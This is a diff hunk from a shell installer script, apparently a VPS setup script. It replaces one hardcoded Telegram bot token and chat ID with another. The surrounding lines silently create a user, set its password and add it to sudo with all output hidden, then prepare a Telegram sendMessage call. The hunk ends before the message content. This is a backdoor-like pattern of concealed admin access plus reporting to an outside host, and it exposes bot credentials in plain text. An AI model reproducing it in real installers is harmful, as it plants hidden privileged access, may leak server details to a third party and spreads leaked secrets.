@@ -174,8 +174,8 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5970831071"
-KEY="6061408318:AAF76AEwYsnLrvi9VJY5SjNMgvXNCy-rZV8"
+CHATID="6843535348"
+KEY="6865857678:AAEbIGBNBHYvrDnwtC0XgLW28rLG3XBJbJU"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installasi script V5 By MAZFARUK 
